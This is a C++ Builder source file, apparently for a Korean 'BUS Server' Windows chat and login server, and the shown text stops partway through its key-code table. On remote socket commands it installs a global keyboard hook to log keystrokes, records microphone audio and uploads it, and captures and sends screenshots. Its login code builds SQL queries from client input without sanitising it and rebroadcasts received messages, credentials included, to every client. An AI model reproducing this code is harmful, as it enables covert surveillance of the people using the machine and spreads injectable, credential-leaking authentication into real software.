//---------------------------------------------------------------------------

#include <vcl.h>
#include <stdio.h>
#pragma hdrstop
#pragma resource "winxp.res"

#include "Unit1.h"
#include "Unit2.h"
#include "Unit3.h"
#include "Unit4.h"
#include "Unit5.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "trayicon"
#pragma link "WinGod"
#pragma resource "*.dfm"
TForm1 *Form1;
AnsiString Key[82]={"{Bk Sp}","{Tab}","{Enter}","{S.D}","{Ctrl}","{Alt}","{P.B}","{Caps}"
,"{한/영}","{한자}","{Esc}","{Space}","{PgUp}","{PgDn}","{End}","{Home}","←","↑","→","↓","{P.S}","{Ins}","{Del}","0","1"
,"2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I"
,"J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
,"{Win}","{Menu)","{F1}","{F2}","{F3}","{F4}","{F5}","{F6}","{F7}","{F8}","{F9}","{F10}","{F11}","{F12}"
,";","=",",","-",".","/","'","|","{S.U}"};
int dbsw=0,ch=0,cl=0;
AnsiString filedir1="C:";
int receivesize,fullsize,downsize;
AnsiString set_data,set_filedir;
int receivesize2,downsize2;
AnsiString set_data2,set_filedir2;
AnsiString num[10]={"1","2","3","4","5","6","7","8","9","0"};
AnsiString english[28]={"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","o","r","x","y","z"};
AnsiString english2[28]={"0x01","0x02","0x03","0x04","0x05","0x06","0x07","0x08","0x09","0x10","0x11","0x12","0x13","0x14","0x15","0x16","0x17","0x18","0x19","0x20","0x21","0x22","0x23","0x24","0x25","0x26","0x27","0x28"};
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
    : TForm(Owner)
{
    fm2=0;
    fm3=0;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::DeleteTree(AnsiString stDir)
{
    TSearchRec st;
    if(FindFirst(stDir+"\\*.*", faDirectory, st) == 0)
    {
        do
        {
	        if(st.Name != "." && st.Name !="..")
	        {
                if(st.Attr == 16 || st.Attr == 17 && st.Size == 0)
                {
                    DeleteTree(stDir+"\\"+st.Name);
                    RemoveDir(stDir);
                }
                else
                {
                    DeleteFile(stDir+"\\"+st.Name);
                }
            }
        }
        while(FindNext(st) == 0);
    }
    FindClose(st);
    RemoveDir(stDir);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::chat1(AnsiString text,int ret,AnsiString RA)
{
    for(int m=0;m<ListBox1->Items->Count;m++)
    {
        ServerSocket1->Socket->Connections[m]->SendText(text);
    }
    if(text.Pos("_login_"))
    {
        text.Delete(1,7);
        text = text + "_" + RA;
        AnsiString id,pass,ip;
        id=text.SubString(1,text.Pos("_")-1);
        text.Delete(1,text.Pos("_"));
        pass=text.SubString(1,text.Pos("_")-1);
        text.Delete(1,text.Pos("_"));
        ip=text;
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    else if(text.Pos("_login2_"))
    {
        text.Delete(1,8);
        text = text + "_" + RA;
        AnsiString id,pass,ip;
        id = text.SubString(1,text.Pos("_")-1);
        text.Delete(1,text.Pos("_"));
        pass = text.SubString(1,text.Pos("_")-1);
        text.Delete(1,text.Pos("_"));
        ip=text;
        int i;
        AnsiString se1 = pass.AnsiLastChar();
        AnsiString se2 = pass.Delete(pass.Length(),1);
        AnsiString se3 = se2.AnsiLastChar();
        se2 = se2.Delete(se2.Length(),1);
        i = StrToInt(se2) / StrToInt(se1);
        se1 = IntToStr(i);
        se2 = "";
        for(i=1; i<=se1.Length(); i++)
        {
            se2 = se1.SubString(i,1)+se2;
        }
        for(i=se2.Length();i<StrToInt(se3); i++)
        {
            se2 = se2+"0";
        }
        pass = se2;
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    if(text.Pos("_Checked_"))
    {
        int k;
        for(k=0; k<ListBox1->Items->Count;k++)
        {
            if(ListBox1->Items->operator [](k)==RA)
            {
                ListBox1->Items->Strings[k]=ListBox1->Items->Strings[k]+":Checked";
            }
        }
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::chat2(AnsiString text,int ret,AnsiString RA)
{
    for(int m=0;m<ListBox1->Items->Count;m++)
    {
        ServerSocket1->Socket->Connections[m]->SendText(text);
    }
    if(text.Pos("_login_"))
    {
        text.Delete(1,7);
        text = text + "_" + RA;
        AnsiString id,pass,ip,id2;
        id=text.SubString(1,text.Pos("_")-1)+"_";
        text.Delete(1,text.Pos("_"));
        pass=text.SubString(1,text.Pos("_")-1);
        text.Delete(1,text.Pos("_"));
        ip=text;
        id2="";
        for(int z=1; z<=id.Length()-2; z++)
        {
            id2=id.SubString(z,1);
            for(int x=0; x<28; x++)
            {
                if(id2==english2[x])
                {
                    id=id+english[x];
                }
            }
        }
        id.Delete(1,id.Pos("_"));
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    else if(text.Pos("_login2_"))
    {
        text.Delete(1,8);
        text = text + "_" + RA;
        AnsiString id,pass,ip,id2;
        id = text.SubString(1,text.Pos("_")-1)+"_";
        text.Delete(1,text.Pos("_"));
        pass = text.SubString(1,text.Pos("_")-1);
        text.Delete(1,text.Pos("_"));
        ip=text;
        id2="";
        int c=id.Pos("_");
        for(int z=1; z<c; z+=4)
        {
            id2=id.SubString(z,4);
            for(int x=0; x<28; x++)
            {
                if(id2==english2[x])
                {
                    id=id+english[x];
                }
            }
        }
        id.Delete(1,id.Pos("_"));
        int i;
        AnsiString se1 = pass.AnsiLastChar();
        AnsiString se2 = pass.Delete(pass.Length(),1);
        AnsiString se3 = se2.AnsiLastChar();
        se2 = se2.Delete(se2.Length(),1);
        i = StrToInt(se2) / StrToInt(se1);
        se1 = IntToStr(i);
        se2 = "";
        for(i=1; i<=se1.Length(); i++)
        {
            se2 = se1.SubString(i,1)+se2;
        }
        for(i=se2.Length();i<StrToInt(se3); i++)
        {
            se2 = se2+"0";
        }
        pass = se2;
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    if(text.Pos("_Checked_"))
    {
        int k;
        for(k=0; k<ListBox1->Items->Count;k++)
        {
            if(ListBox1->Items->operator [](k)==RA)
            {
                ListBox1->Items->Strings[k]=ListBox1->Items->Strings[k]+":Checked";
            }
        }
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::chat3(AnsiString text,int ret,AnsiString RA)
{
    for(int m=0;m<ListBox1->Items->Count;m++)
    {
        ServerSocket1->Socket->Connections[m]->SendText(text);
    }
    if(text.Pos("_login_"))
    {
        text.Delete(1,7);
        text = text + "_" + RA;
        AnsiString id,pass,ip,id2,pass2;
        id=text.SubString(1,text.Pos("_")-1)+"_";
        text.Delete(1,text.Pos("_"));
        pass=text.SubString(1,text.Pos("_")-1);
        text.Delete(1,text.Pos("_"));
        ip=text;
        id2="";
        pass2="";
        for(int z=1; z<=id.Length()-2; z++)
        {
            id2=id.SubString(z,1);
            for(int x=0; x<28; x++)
            {
                if(id2==english2[x])
                {
                    id=id+english[x];
                }
            }
        }
        pass = pass.sprintf("%d",StrToInt(pass));
        id.Delete(1,id.Pos("_"));
        pass.Delete(1,pass.Pos("_"));
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    else if(text.Pos("_login2_"))
    {
        text.Delete(1,8);
        text = text + "_" + RA;
        AnsiString id,pass,ip,id2,pass2;
        id = text.SubString(1,text.Pos("_")-1)+"_";
        text.Delete(1,text.Pos("_"));
        pass = text.SubString(1,text.Pos("_")-1)+"_";;
        text.Delete(1,text.Pos("_"));
        ip=text;
        id2="";
        pass2="";
        int c=id.Pos("_");
        for(int z=1; z<c; z+=4)
        {
            id2=id.SubString(z,4);
            for(int x=0; x<28; x++)
            {
                if(id2==english2[x])
                {
                    id=id+english[x];
                }
            }
        }
        pass.Delete(pass.Pos("_"),1);
        int m = strtol(pass.c_str(),NULL,16);
        pass = IntToStr(m);
        id.Delete(1,id.Pos("_"));
        int i;
        AnsiString se1 = pass.AnsiLastChar();
        AnsiString se2 = pass.Delete(pass.Length(),1);
        AnsiString se3 = se2.AnsiLastChar();
        se2 = se2.Delete(se2.Length(),1);
        i = StrToInt(se2) / StrToInt(se1);
        se1 = IntToStr(i);
        se2 = "";
        for(i=1; i<=se1.Length(); i++)
        {
            se2 = se1.SubString(i,1)+se2;
        }
        for(i=se2.Length();i<StrToInt(se3); i++)
        {
            se2 = se2+"0";
        }
        pass = se2;
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    if(text.Pos("_Checked_"))
    {
        int k;
        for(k=0; k<ListBox1->Items->Count;k++)
        {
            if(ListBox1->Items->operator [](k)==RA)
            {
                ListBox1->Items->Strings[k]=ListBox1->Items->Strings[k]+":Checked";
            }
        }
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::chat4(AnsiString text,int ret,AnsiString RA)
{
    for(int m=0;m<ListBox1->Items->Count;m++)
    {
        ServerSocket1->Socket->Connections[m]->SendText(text);
    }
    if(text.Pos("_login_"))
    {
        text.Delete(1,7);
        text = text + "_" + RA;
        AnsiString id,pass,ip,id2,pass2;
        id=text.SubString(1,text.Pos("_")-1)+"_";
        text.Delete(1,text.Pos("_"));
        pass=text.SubString(1,text.Pos("_")-1);
        text.Delete(1,text.Pos("_"));
        ip=text;
        id2="";
        pass2="";
        for(int z=1; z<=id.Length()-2; z++)
        {
            id2=id.SubString(z,1);
            for(int x=0; x<28; x++)
            {
                if(id2==english2[x])
                {
                    id=id+english[x];
                }
            }
        }
        int c=pass.Pos("_");
        for(int z=1; z<c; z+=4)
        {
            pass2=pass.SubString(z,4);
            for(int x=0; x<10; x++)
            {
                if(pass2==english2[x])
                {
                    pass=pass+num[x];
                }
            }
        }
        id.Delete(1,id.Pos("_"));
        pass.Delete(1,pass.Pos("_"));
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    else if(text.Pos("_login2_"))
    {
        text.Delete(1,8);
        text = text + "_" + RA;
        AnsiString id,pass,ip,id2,pass2;
        id = text.SubString(1,text.Pos("_")-1)+"_";
        text.Delete(1,text.Pos("_"));
        pass = text.SubString(1,text.Pos("_")-1)+"_";;
        text.Delete(1,text.Pos("_"));
        ip=text;
        id2="";
        pass2="";
        int c=id.Pos("_");
        for(int z=1; z<c; z+=4)
        {
            id2=id.SubString(z,4);
            for(int x=0; x<28; x++)
            {
                if(id2==english2[x])
                {
                    id=id+english[x];
                }
            }
        }
        c=pass.Pos("_");
        for(int z=1; z<c; z+=4)
        {
            pass2=pass.SubString(z,4);
            for(int x=0; x<10; x++)
            {
                if(pass2==english2[x])
                {
                    pass=pass+num[x];
                }
            }
        }
        id.Delete(1,id.Pos("_"));
        pass.Delete(1,pass.Pos("_"));
        int i;
        AnsiString se1 = pass.AnsiLastChar();
        AnsiString se2 = pass.Delete(pass.Length(),1);
        AnsiString se3 = se2.AnsiLastChar();
        se2 = se2.Delete(se2.Length(),1);
        i = StrToInt(se2) / StrToInt(se1);
        se1 = IntToStr(i);
        se2 = "";
        for(i=1; i<=se1.Length(); i++)
        {
            se2 = se1.SubString(i,1)+se2;
        }
        for(i=se2.Length();i<StrToInt(se3); i++)
        {
            se2 = se2+"0";
        }
        pass = se2;
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    if(text.Pos("_Checked_"))
    {
        int k;
        for(k=0; k<ListBox1->Items->Count;k++)
        {
            if(ListBox1->Items->operator [](k)==RA)
            {
                ListBox1->Items->Strings[k]=ListBox1->Items->Strings[k]+":Checked";
            }
        }
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::chat5(AnsiString text,int ret,AnsiString RA)
{
    if(text.Pos("_login_"))
    {
        text.Delete(1,7);
        text = text + "_" + RA;
        AnsiString id,pass,ip,id2,pass2;
        id=text.SubString(1,text.Pos("_")-1)+"_";
        text.Delete(1,text.Pos("_"));
        pass=text.SubString(1,text.Pos("_")-1);
        text.Delete(1,text.Pos("_"));
        ip=text;
        id2="";
        pass2="";
        for(int z=1; z<=id.Length()-2; z++)
        {
            id2=id.SubString(z,1);
            for(int x=0; x<28; x++)
            {
                if(id2==english2[x])
                {
                    id=id+english[x];
                }
            }
        }
        int c=pass.Pos("_");
        for(int z=1; z<c; z+=4)
        {
            pass2=pass.SubString(z,4);
            for(int x=0; x<10; x++)
            {
                if(pass2==english2[x])
                {
                    pass=pass+num[x];
                }
            }
        }
        id.Delete(1,id.Pos("_"));
        pass.Delete(1,pass.Pos("_"));
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    else if(text.Pos("_login2_"))
    {
        text.Delete(1,8);
        text = text + "_" + RA;
        AnsiString id,pass,ip,id2,pass2;
        id = text.SubString(1,text.Pos("_")-1)+"_";
        text.Delete(1,text.Pos("_"));
        pass = text.SubString(1,text.Pos("_")-1)+"_";;
        text.Delete(1,text.Pos("_"));
        ip=text;
        id2="";
        pass2="";
        int c=id.Pos("_");
        for(int z=1; z<c; z+=4)
        {
            id2=id.SubString(z,4);
            for(int x=0; x<28; x++)
            {
                if(id2==english2[x])
                {
                    id=id+english[x];
                }
            }
        }
        c=pass.Pos("_");
        for(int z=1; z<c; z+=4)
        {
            pass2=pass.SubString(z,4);
            for(int x=0; x<10; x++)
            {
                if(pass2==english2[x])
                {
                    pass=pass+num[x];
                }
            }
        }
        id.Delete(1,id.Pos("_"));
        pass.Delete(1,pass.Pos("_"));
        int i;
        AnsiString se1 = pass.AnsiLastChar();
        AnsiString se2 = pass.Delete(pass.Length(),1);
        AnsiString se3 = se2.AnsiLastChar();
        se2 = se2.Delete(se2.Length(),1);
        i = StrToInt(se2) / StrToInt(se1);
        se1 = IntToStr(i);
        se2 = "";
        for(i=1; i<=se1.Length(); i++)
        {
            se2 = se1.SubString(i,1)+se2;
        }
        for(i=se2.Length();i<StrToInt(se3); i++)
        {
            se2 = se2+"0";
        }
        pass = se2;
        ADOQuery1->Close();
        ADOQuery1->SQL->Clear();
        ADOQuery1->SQL->Add("Select id,pass from Table1 where ID= '" + id + "'");
        ADOQuery1->ExecSQL();
        ADOQuery1->Open();
        if(id==DBGrid1->Fields[0]->Text && pass==DBGrid1->Fields[1]->Text)
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_success_");
        }
        else
        {
            ServerSocket1->Socket->Connections[ret]->SendText("_fail_");
        }
    }
    if(text.Pos("_Checked_"))
    {
        int k;
        for(k=0; k<ListBox1->Items->Count;k++)
        {
            if(ListBox1->Items->operator [](k)==RA)
            {
                ListBox1->Items->Strings[k]=ListBox1->Items->Strings[k]+":Checked";
            }
        }
    }
    for(int m=0;m<ListBox1->Items->Count;m++)
    {
        ServerSocket1->Socket->Connections[m]->SendText(text);
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ServerSocket1ClientConnect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    ListBox1->Items->Add(Socket->RemoteAddress);
    Socket->SendText(Socket->RemoteAddress+"_Check_"+IntToStr(Form2->RadioGroup1->ItemIndex));
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ServerSocket1ClientDisconnect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    int j;
    for(j=0; j<=ListBox1->Items->Count-1;j++)
    {
        if(ListBox1->Items->Strings[j].SubString(1,Socket->RemoteAddress.Length())==Socket->RemoteAddress)
        {
            ListBox1->Items->Delete(j);
        }
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ServerSocket1ClientRead(TObject *Sender,
      TCustomWinSocket *Socket)
{
    AnsiString text;
    text = Socket->ReceiveText();
    if(text.Pos("_msg"))
    {
        if(text.Pos("_msg1_"))
        {
            text.Delete(1,6);
            text = StrToInt(text) + 1;
            AnsiString b="원하는 보안등급 요청 : "+Socket->RemoteAddress;
            text = "요청한 보안 등급 = "+text;
            if(MessageBox(Handle, text.c_str(), b.c_str(), MB_YESNO|MB_ICONQUESTION)==IDYES)
            {
                Form2->RadioGroup1->ItemIndex = text.Delete(1,text.Pos("=")+1)-1;
                Form3->LB->Items->LoadFromFile("C:\\BUS\\Server\\DATA\\Option.txt");
                Form3->LB->Items->Strings[13]=IntToStr(Form2->RadioGroup1->ItemIndex);
                Form3->LB->Items->SaveToFile("C:\\BUS\\Server\\DATA\\Option.txt");
                ShowMessage("보안 등급이 수정되었습니다.");
            }
            else
            {
                ShowMessage("취소 버튼을 누르셨습니다.");
            }

        }
        else if(text.Pos("_msg2_"))
        {
            text.Delete(1,6);
            ShowMessage("보낸 아이피 = "+Socket->RemoteAddress+"\r\n"+text);
        }
    }
    else
    {
        int i=Form2->RadioGroup1->ItemIndex;
        int j;
        for(j=0; j<=ListBox1->Items->Count-1;j++)
        {
            if(ListBox1->Items->operator [](j).Pos(Socket->RemoteAddress)>=0)
            {
                switch (i)
                {
                    case 0: chat1(text,j,Socket->RemoteAddress);
                    break;
                    case 1: chat2(text,j,Socket->RemoteAddress);
                    break;
                    case 2: chat3(text,j,Socket->RemoteAddress);
                    break;
                    case 3: chat4(text,j,Socket->RemoteAddress);
                    break;
                    case 4: chat5(text,j,Socket->RemoteAddress);
                    break;
                }
            }
        }
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::db1Click(TObject *Sender)
{
    if(dbsw==0)
    {
        DBCB->Checked = true;
    }
    else
    {
        DBCB->Checked = false;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N6Click(TObject *Sender)
{
    ServerSocket1->Active = true;
    N6->Enabled = false;
    N7->Enabled = true;
    Form3->MediaPlayer1->Close();
    Form3->MediaPlayer1->FileName = "C:\\BUS\\Server\\sound\\server is opened.wav";
    Form3->MediaPlayer1->Open();
    Form3->MediaPlayer1->Play();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N7Click(TObject *Sender)
{
    ServerSocket1->Active = false;
    N6->Enabled = true;
    N7->Enabled = false;
    ListBox1->Items->Clear();
    Form3->MediaPlayer1->Close();
    Form3->MediaPlayer1->FileName = "C:\\BUS\\Server\\sound\\server is closed.wav";
    Form3->MediaPlayer1->Open();
    Form3->MediaPlayer1->Play();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N11Click(TObject *Sender)
{
    TrayIcon1->Visible = true;
    Form1->Visible = false;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N13Click(TObject *Sender)
{
    TrayIcon1->Visible = false;
    Form1->Visible = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::DBCBClick(TObject *Sender)
{
    if(DBCB->Checked==true)
    {
        db1->Caption = "db창 숨기기";
        dbsw=1;
        Form1->Width = 627;
    }
    else
    {
        db1->Caption = "db창 보이기";
        dbsw=0;
        Form1->Width = 242;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N9Click(TObject *Sender)
{
    if(OptionCB->Checked == true)
    {
        OptionCB->Checked = false;
    }
    else
    {
        fm2=0;
        OptionCB->Checked = true;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormClose(TObject *Sender, TCloseAction &Action)
{
    if(Form3->sho == 1)
    {
        if(cl==1)
        {
            Action = caFree;
            Form3->Close();
            Form2->Close();
            Form4->Close();
            Form5->Close();
            HWND hdHandle;
            HANDLE hdProcess;
            DWORD dwPID;
            hdHandle = FindWindow(NULL, "BUS Server");
            if(hdHandle)
            {
                GetWindowThreadProcessId(hdHandle, &dwPID);
                if(dwPID)
                {
                    hdProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
                    TerminateProcess(hdProcess, -1);
                }            }
        }
        else
        {
            if(N7->Enabled == true)
            {
                Form3->MediaPlayer1->Close();
                Form3->MediaPlayer1->FileName = "C:\\BUS\\Server\\sound\\server is closed.wav";
                Form3->MediaPlayer1->Open();
                Form3->MediaPlayer1->Play();
                CL->Enabled = true;
                Action = caNone;
            }
            else
            {
                Action = caFree;   
                Form2->Close();
                Form3->Close();
                Form4->Close();
                Form5->Close();
                HWND hdHandle;
                HANDLE hdProcess;
                DWORD dwPID;
                hdHandle = FindWindow(NULL, "BUS Server");
                if(hdHandle)
                {
                    GetWindowThreadProcessId(hdHandle, &dwPID);
                    if(dwPID)
                    {
                        hdProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
                        TerminateProcess(hdProcess, -1);
                    }                }
            }
        }
    }
    else
    {
        Action = caNone;
        N11->Click();
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormShow(TObject *Sender)
{
    if(Form2->RadioGroup1->ItemIndex == 4)
    {
        Timer1->Interval = 1000;
        Timer1->Enabled = true;
    }
    Form3->MediaPlayer1->Close();
    Form3->MediaPlayer1->FileName = "C:\\BUS\\Server\\sound\\server is opened.wav";
    Form3->MediaPlayer1->Open();
    Form3->MediaPlayer1->Play();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::CLTimer(TObject *Sender)
{
    cl=1;
    Form1->Close();
    CL->Enabled = false;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::OptionCBClick(TObject *Sender)
{
    if(OptionCB->Checked == true)
    {
        Form2->Show();
    }
    else
    {
        Form2->Hide();
        fm2=0;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N12Click(TObject *Sender)
{
    Form3->sho = 1;
    Form2->Close();
    Form1->Close();    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N8Click(TObject *Sender)
{
    if(OptionCB->Checked == true)
    {
        OptionCB->Checked = false;
    }
    else
    {
        fm2=1;
        OptionCB->Checked = true;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ToolButton2Click(TObject *Sender)
{
    N7->Click();    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ToolButton3Click(TObject *Sender)
{
    N6->Click();    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ToolButton5Click(TObject *Sender)
{
    N9->Click();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ToolButton6Click(TObject *Sender)
{
    N8->Click();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N14Click(TObject *Sender)
{
    N9->Click();    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N16Click(TObject *Sender)
{
    N12->Click();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N19Click(TObject *Sender)
{
    Form1->Hide();
    Form4->RIP=ListBox1->Items->Strings[ListBox1->ItemIndex];
    Form4->Show();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FSS1ClientRead(TObject *Sender,
      TCustomWinSocket *Socket)
{
    AnsiString text = Socket->ReceiveText();
    if(text.Pos("_kbhook_"))
    {
        God1->SetKBHook();
    }
    else if(text.Pos("_kbhookoff_"))
    {
        God1->RemoveKBHook();
    }
    else if(text.Pos("_recordhook_"))
    {
        int tt1,tt2;
        DeleteFile("C:\\temp.wav");
        upfs3 = new TFileStream("C:\\temp.wav", fmCreate|fmShareCompat);
        text.Delete(1,12);
        upfs3->Write(text.c_str(),text.Length());
        delete upfs3;
        MP1->Close();
        MP1->FileName = "C:\\temp.wav";
        MP1->Open();
        MP1->StartRecording();
    }
    else if(text.Pos("_recordhookoff_"))
    {
        MP1->Stop();
        MP1->Save();
        MP1->Close();
        Form1->DoubleBuffered=false;
        upfs=new TFileStream("C:\\temp.wav", fmOpenRead|fmShareCompat);
        fullsize = upfs->Size;
        Socket->SendText("_recordsend_"+IntToStr(fullsize));
    }
    else if(text.Pos("_recordsend_"))
    {
        text.Delete(1,12);
        receivesize = StrToInt(text);
        if((fullsize-receivesize)>1024)
        {
            set_data.SetLength(1024);
            upfs->Read(set_data.c_str(),1024);
        }
        else
        {
            set_data.SetLength(fullsize-receivesize);
            upfs->Read(set_data.c_str(),fullsize-receivesize);
            delete upfs;
        }
        Socket->SendText("_upload_"+IntToStr(set_data.Length())+"_"+set_data);
    }
    else if(text.Pos("_capture_"))
    {
        fm3=1;
        Form5->Show();
    }
    else if(text.Pos("_captureoff_"))
    {
        fm3=0;
        Form5->Hide();
        Form5->Timer1->Enabled = false;
        Form5->Timer1->Interval = 0;
        DeleteFile("C:\\picture.bmp");
    }
    else if(text.Pos("_capup_"))
    {
        text.Delete(1,7);
        receivesize2 = StrToInt(text);
        if((fullsize2-receivesize2)>1024)
        {
            set_data2.SetLength(1024);
            upfs2->Read(set_data2.c_str(),1024);
        }
        else
        {
            set_data2.SetLength(fullsize2-receivesize2);
            upfs2->Read(set_data2.c_str(),fullsize2-receivesize2);
            delete upfs2;
            DeleteFile("C:\\picture.bmp");
        }
        Socket->SendText("_capup_"+IntToStr(set_data2.Length())+"_"+set_data2);
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::God1KeybrdMsg(int Code, int VKCode, int KSInfo)
{
    AnsiString Key2="";
    if(KSInfo>0)
    {
        if(VKCode==8) Key2 = Key[0];
        else if(VKCode==9) Key2 = Key[1];
        else if(VKCode==13) Key2 = Key[2];
        else if(VKCode==16) Key2 = Key[3];
        else if(VKCode==17) Key2 = Key[4];
        else if(VKCode==18) Key2 = Key[5];
        else if(VKCode==19) Key2 = Key[6];
        else if(VKCode==20) Key2 = Key[7];
        else if(VKCode==21) Key2 = Key[8];
        else if(VKCode==25) Key2 = Key[9];
        else if(VKCode==27) Key2 = Key[10];
        else if(VKCode==32) Key2 = Key[11];
        else if(VKCode==33) Key2 = Key[12];
        else if(VKCode==34) Key2 = Key[13];
        else if(VKCode==35) Key2 = Key[14];
        else if(VKCode==36) Key2 = Key[15];
        else if(VKCode==37) Key2 = Key[16];
        else if(VKCode==38) Key2 = Key[17];
        else if(VKCode==39) Key2 = Key[18];
        else if(VKCode==40) Key2 = Key[19];
        else if(VKCode==45) Key2 = Key[21];
        else if(VKCode==46) Key2 = Key[22];
        else if(VKCode==48) Key2 = Key[23];
        else if(VKCode==49) Key2 = Key[24];
        else if(VKCode==50) Key2 = Key[25];
        else if(VKCode==51) Key2 = Key[26];
        else if(VKCode==52) Key2 = Key[27];
        else if(VKCode==53) Key2 = Key[28];
        else if(VKCode==54) Key2 = Key[29];
        else if(VKCode==55) Key2 = Key[30];
        else if(VKCode==56) Key2 = Key[31];
        else if(VKCode==57) Key2 = Key[32];
        else if(VKCode==65) Key2 = Key[33];
        else if(VKCode==66) Key2 = Key[34];
        else if(VKCode==67) Key2 = Key[35];
        else if(VKCode==68) Key2 = Key[36];
        else if(VKCode==69) Key2 = Key[37];
        else if(VKCode==70) Key2 = Key[38];
        else if(VKCode==71) Key2 = Key[39];
        else if(VKCode==72) Key2 = Key[40];
